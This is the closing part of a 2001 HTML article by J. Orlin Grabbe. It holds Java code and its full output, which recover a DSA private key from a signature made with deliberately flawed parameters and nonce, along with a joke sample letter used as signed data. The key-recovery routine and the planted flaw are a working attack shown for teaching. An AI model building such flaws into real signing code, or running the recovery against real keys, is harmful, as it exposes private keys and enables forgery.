+        	output.println("g^((p-1)/t)*j) is = " + w);
+
+		// calculate w from w mod t and w mod 2^s
+		Ij = new Integer(j);
+		w = Ij.toString();
+		Bj = new BigInteger(w);
+		w = cryptix.util.core.BI.dumpString(Bj);
+		output.println("j as BigInteger " + w);
+		Hack = Two.pow(sk);
+		Ba = Hack.modInverse(Btk);
+		Bb = Bj.subtract(val);
+		Bb = Bb.multiply(Ba);
+		Bb = Bb.mod(Btk);
+		Bv = Bb.multiply(Hack);
+		Bv = Bv.add(val);
+		Bv = Bv.mod(q);
+   		w = cryptix.util.core.BI.dumpString(Bv);
+		output.println("value of w from CRT is: " + w);
+
+		// now determine the set K (w determines 4 possible values for k)
+		Bb = p.subtract(One);
+		Bu1 = r.modInverse(q);
+		Integer Ii;
+		
+		for(i=0;i<4;i++) {
+
+		Ii = new Integer(i);
+		w = Ii.toString();
+		Ba = new BigInteger(w);
+
+		kk = Ba.multiply(Bb);
+		kk = Bv.add(kk);
+
+     		w = cryptix.util.core.BI.dumpString(kk);
+        	output.println("possible value of k is = " + w);
+
+		Ba = kk.multiply(s);
+		Ba = Ba.subtract(Bhash);
+		Ba = Ba.multiply(Bu1);
+		Ba = Ba.mod(q);
+
+     		w = cryptix.util.core.BI.dumpString(Ba);
+        	output.println("possible private key (calculated) x is = " + w);
+
+		Bu2 = gstore.modPow(Ba,pstore);
+     		w = cryptix.util.core.BI.dumpString(Bu2);
+        	output.println("calculated public key y from possible private key is = " 
+				+ w);
+
+		if(Bu2.compareTo(y)==0) {
+		output.println("Private key found! This is it!**********************");
+		output.println(" ");
+			break;  } 
+					}		
+
+        	w = cryptix.util.core.BI.dumpString(x);
+        	output.println(" (real) private key x actually is = " + w);
+
+		outFile.close();
+		System.out.println("File written");
+
+        } catch (Exception e) {
+            System.err.println("Caught exception " + e.toString());
+        }
+    }
+}
+</pre>
+<hr>
+<h4 align="center">data</h4>
+<p>
+<pre>
+Senator Hand N. Till
+Washington, DC
+
+Dear Senator:
+
+This letter is to inform you we have
+opened account no. 338907021 on your
+behalf, and deposted therein a
+legislative incentive payment of
+$1 million.  For withdrawl, you will
+need to use your password BJRGUD7693.
+
+Yours very truly,
+
+Arnold C. Creole
+Vice President
+Greater Caribbean Bank
+<p>
+<hr>
+<h4 align="center">Flaw.out</h4>
+<p>
+<pre>
+g = Multi-Precision Integer 1024 bits long...
+      sign: Positive
+ magnitude: Hexadecimal dump of 128 bytes...
+   0: F7E1A085D69B3DDE CBBCAB5C36B857B9 7994AFBBFA3AEA82 F9574C0B3D078267 
+  32: 5159578EBAD4594F E67107108180B449 167123E84C281613 B7CF09328CC8A6E1 
+  64: 3C167A8B547C8D28 E0A3AE1E2BB3A675 916EA37F0BFA2135 62F1FB627A01243B 
+  96: CCA4F1BEA8519089 A883DFE15AE59F06 928B665E807B5525 64014C3BFECF492A 
+
+q = Multi-Precision Integer 160 bits long...
+      sign: Positive
+ magnitude: 9760508F15230BCC B292B982A2EB840B F0581CF5
+
+p = Multi-Precision Integer 1024 bits long...
+      sign: Positive
+ magnitude: Hexadecimal dump of 128 bytes...
+   0: FD7F53811D751229 52DF4A9C2EECE4E7 F611B7523CEF4400 C31E3F80B6512669 
+  32: 455D402251FB593D 8D58FABFC5F5BA30 F6CB9B556CD7813B 801D346FF26660B7 
+  64: 6B9950A5A49F9FE8 047B1022C24FBBA9 D7FEB7C61BF83B57 E7C6A8A6150F04FB 
+  96: 83F6D3C51EC30235 54135A169132F675 F3AE2B61D72AEFF2 2203199DD14801C7 
+
+pprime = Multi-Precision Integer 159 bits long...
+      sign: Positive
+ magnitude: 5380000000000000 0000000000000000 00000001
+
+gprime = Multi-Precision Integer 158 bits long...
+      sign: Positive
+ magnitude: 31AC85291FF814E6 25E4B88C8C5047A7 DB2F0E45
+
+20 random bytes: 3D31A3E3FE8722EC C997BDF6286F3E90 09392CE4
+
+the SHA-1 hash of data is 1A01B56EB33FA84A 39EEDDD927977726 38331E94
+
+generator g = Multi-Precision Integer 1024 bits long...
+      sign: Positive
+ magnitude: Hexadecimal dump of 128 bytes...
+   0: F7E1A085D69B3DDE CBBCAB5C36B857B9 7994AFBBFA3AEA82 F9574C0B3D078267 
+  32: 5159578EBAD4594F E67107108180B449 167123E84C281613 B7CF09328CC8A6E1 
+  64: 3C167A8B547C8D28 E0A3AE1E2BB3A675 916EA37F0BFA2135 62F1FB627A01243B 
+  96: CCA4F1BEA8519089 A883DFE15AE59F06 928B665E807B5525 64014C3BFECF492A 
+
+prime p = Multi-Precision Integer 1024 bits long...
+      sign: Positive
+ magnitude: Hexadecimal dump of 128 bytes...
+   0: FD7F53811D751229 52DF4A9C2EECE4E7 F611B7523CEF4400 C31E3F80B6512669 
+  32: 455D402251FB593D 8D58FABFC5F5BA30 F6CB9B556CD7813B 801D346FF26660B7 
+  64: 6B9950A5A49F9FE8 047B1022C24FBBA9 D7FEB7C61BF83B57 E7C6A8A6150F04FB 
+  96: 83F6D3C51EC30235 54135A169132F675 F3AE2B61D72AEFF2 2203199DD14801C7 
+
+order q of group G(q) = Multi-Precision Integer 160 bits long...
+      sign: Positive
+ magnitude: 9760508F15230BCC B292B982A2EB840B F0581CF5
+
+p mod q = Multi-Precision Integer 1 bits long...
+      sign: Positive
+ magnitude: 01
+
+g^q mod p = Multi-Precision Integer 1 bits long...
+      sign: Positive
+ magnitude: 01
+ 
+private key x = Multi-Precision Integer 160 bits long...
+      sign: Positive
+ magnitude: 805C2D4BF743063C ABF060AD48E04BD6 813DA8B6
+ 
+public key y = Multi-Precision Integer 1022 bits long...
+      sign: Positive
+ magnitude: Hexadecimal dump of 128 bytes...
+   0: 238165021ED0CC41 CE03A6DC15AE7FCE 33EA11AD53EF486A 25BB367BEC661019 
+  32: 21DF966D13129929 DDE3C3842B96869F DC3A2A8FBDBB7AD5 2910CA10A5C257FC 
+  64: 11D9F40606093C40 AA37BFE19A8D5AFF 878B2CE5215A6D7D A47E717BA7BBC380 
+  96: 57CD70EDA92B4AAD 47317AB16E6E7485 89E6F5B6030BC5A9 DCC569C5923C88EF 
+ 
+Note here that the value of 
+g^x mod p = Multi-Precision Integer 1022 bits long...
+      sign: Positive
+ magnitude: Hexadecimal dump of 128 bytes...
+   0: 238165021ED0CC41 CE03A6DC15AE7FCE 33EA11AD53EF486A 25BB367BEC661019 
+  32: 21DF966D13129929 DDE3C3842B96869F DC3A2A8FBDBB7AD5 2910CA10A5C257FC 
+  64: 11D9F40606093C40 AA37BFE19A8D5AFF 878B2CE5215A6D7D A47E717BA7BBC380 
+  96: 57CD70EDA92B4AAD 47317AB16E6E7485 89E6F5B6030BC5A9 DCC569C5923C88EF 
+
+which verifies the public key y.
+the SHA-1 hash of data is 1A01B56EB33FA84A 39EEDDD927977726 38331E94
+
+the DSA signature (byte array) is Hexadecimal dump of 46 bytes...
+   0: 302C021409116D17 82C71F51A5EDB9F5 B3C798F943B9E4EB 021473BEA15C1A8D 
+  32: 10B0BAFE58314C62 EB149A565506
+
+the DSA signature (BigInteger) is Multi-Precision Integer 366 bits long...
+      sign: Positive
+ magnitude: Hexadecimal dump of 46 bytes...
+   0: 302C021409116D17 82C71F51A5EDB9F5 B3C798F943B9E4EB 021473BEA15C1A8D 
+  32: 10B0BAFE58314C62 EB149A565506
+
+ j = 0 k = 0
+ sig[3] = 20 sig[25] = 20 sig[26] = 115
+The first number in signature = Multi-Precision Integer 156 bits long...
+      sign: Positive
+ magnitude: 09116D1782C71F51 A5EDB9F5B3C798F9 43B9E4EB
+ 
+The second number in signature = Multi-Precision Integer 159 bits long...
+      sign: Positive
+ magnitude: 73BEA15C1A8D10B0 BAFE58314C62EB14 9A565506
+ 
+verify (independent calculation) = true
+verfication number is = Multi-Precision Integer 156 bits long...
+      sign: Positive
+ magnitude: 09116D1782C71F51 A5EDB9F5B3C798F9 43B9E4EB
+ 
+signature verifies (verification function): true
+ 
+20 random bytes: 61550831C9706488 CD629EA27210913A 57CC706F
+
+random bytes mod q: Multi-Precision Integer 159 bits long...
+      sign: Positive
+ magnitude: 61550831C9706488 CD629EA27210913A 57CC706F
+
+The first number in (possibly faux) signature = Multi-Precision Integer 159 bits long...
+      sign: Positive
+ magnitude: 493EAAD329C3C11B D47F33176AFFB7C5 1FDE5E43
+ 
+The second number in (possibly faux) signature = Multi-Precision Integer 157 bits long...
+      sign: Positive
+ magnitude: 14DE116BA852E884 0C61594DF1BC9370 B36D8E88
+ 
+verify (independent calculation) = true
+verfication number is = Multi-Precision Integer 159 bits long...
+      sign: Positive
+ magnitude: 493EAAD329C3C11B D47F33176AFFB7C5 1FDE5E43
+ 
+The first number in (possibly faux) signature = Multi-Precision Integer 157 bits long...
+      sign: Positive
+ magnitude: 11C87AC06A1652B3 CAFA55483B555EAD C3CD9FCE
+ 
+The second number in (possibly faux) signature = Multi-Precision Integer 158 bits long...
+      sign: Positive
+ magnitude: 2D937BE8CD9589FE 7EC021A4A1C67604 DA453263
+ 
+verify (ind calculation) = false
+verfication number is = Multi-Precision Integer 158 bits long...
+      sign: Positive
+ magnitude: 3FBE37FB180D06E7 40BA916E4683014A 9F4D2DA2
+ 
+pprime (calculated) is = Multi-Precision Integer 159 bits long...
+      sign: Positive
+ magnitude: 5380000000000000 0000000000000000 00000001
+
+10101010000100000110001110010010111000001100100100010001100110101100010100111101010001001
+11001000010000100100010011101001010111110011000111000001101111 
+***** w mod 2^s is = Multi-Precision Integer 151 bits long...
+      sign: Positive
+ magnitude: 550831C9706488CD 629EA27210913A57 CC706F
+
+r^((p-1)/t) is = Multi-Precision Integer 158 bits long...
+      sign: Positive
+ magnitude: 3128B1FBDE970C45 5CE866745A4E7352 86E28BD4
+
+g^((p-1)/t) is = Multi-Precision Integer 158 bits long...
+      sign: Positive
+ magnitude: 27663E4E278ACAE6 75B78DD4474AB491 74B5B540
+
+***** w mod t = 62
+r^((p-1)/t) is = Multi-Precision Integer 158 bits long...
+      sign: Positive
+ magnitude: 3128B1FBDE970C45 5CE866745A4E7352 86E28BD4
+
+g^((p-1)/t)*j) is = Multi-Precision Integer 158 bits long...
+      sign: Positive
+ magnitude: 3128B1FBDE970C45 5CE866745A4E7352 86E28BD4
+
+j as BigInteger Multi-Precision Integer 6 bits long...
+      sign: Positive
+ magnitude: 3E
+
+value of w from CRT is: Multi-Precision Integer 156 bits long...
+      sign: Positive
+ magnitude: 0DD50831C9706488 CD629EA27210913A 57CC706F
+
+possible value of k is = Multi-Precision Integer 156 bits long...
+      sign: Positive
+ magnitude: 0DD50831C9706488 CD629EA27210913A 57CC706F
+
+possible private key (calculated) x is = Multi-Precision Integer 159 bits long...
+      sign: Positive
+ magnitude: 58106551A192AB4B 09659D32BFF1EA0F 84CF9F68
+
+calculated public key y from possible private key is = Multi-Precision Integer 1024 bits 
+long...
+      sign: Positive
+ magnitude: Hexadecimal dump of 128 bytes...
+   0: BD2F43CA5CDA71AA 6C688315396D0BC9 40D5356ABA5F2F53 91620B56420E8BBB 
+  32: 656C430D27CBC638 DAA1F7A9C25C3AB4 855EAF236FE0FE15 7BD7F3011B411BA9 
+  64: E4855A28524746FD B8EF8CFEF070DC64 FD16D9B82056BCDB 7A851B0E4FB6F8BE 
+  96: 07D9D51671F6A213 8719040D1C24C960 C4B6190BBD3E4BE6 0A10495C4C063107 
+
+possible value of k is = Multi-Precision Integer 159 bits long...
+      sign: Positive
+ magnitude: 61550831C9706488 CD629EA27210913A 57CC706F
+
+possible private key (calculated) x is = Multi-Precision Integer 160 bits long...
+      sign: Positive
+ magnitude: 805C2D4BF743063C ABF060AD48E04BD6 813DA8B6
+
+calculated public key y from possible private key is = Multi-Precision Integer 1022 bits 
+long...
+      sign: Positive
+ magnitude: Hexadecimal dump of 128 bytes...
+   0: 238165021ED0CC41 CE03A6DC15AE7FCE 33EA11AD53EF486A 25BB367BEC661019 
+  32: 21DF966D13129929 DDE3C3842B96869F DC3A2A8FBDBB7AD5 2910CA10A5C257FC 
+  64: 11D9F40606093C40 AA37BFE19A8D5AFF 878B2CE5215A6D7D A47E717BA7BBC380 
+  96: 57CD70EDA92B4AAD 47317AB16E6E7485 89E6F5B6030BC5A9 DCC569C5923C88EF 
+
+Private key found! This is it!**********************
+ 
+ (real) private key x actually is = Multi-Precision Integer 160 bits long...
+      sign: Positive
+ magnitude: 805C2D4BF743063C ABF060AD48E04BD6 813DA8B6
+</pre>
+<center><table border=0 width=60%><tr><td>
+<hr>
+<p align="justify">J. Orlin Grabbe is the author of
+<a href="http://www.amazon.com/exec/obidos/ASIN/0132069881/qid=924154369/sr=1-1/002-9261014-2388004">
+International Financial Markets</A>, and is an internationally recognized derivatives expert.  He has recently branched out into cryptology, banking security, and digital cash.  His home page is located at <A HREF="http://orlingrabbe.org/">http://orlingrabbe.org/</A> . 
+<p>
+<center><b>-30-</b></center>
+<p>
+<center><b>from <a href="http://zolatimes.com/"><i>The Laissez Faire City Times</i></a>, Vol 5, No 16, 
+April 16, 2001</b></center>
+</td></tr></table></center>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
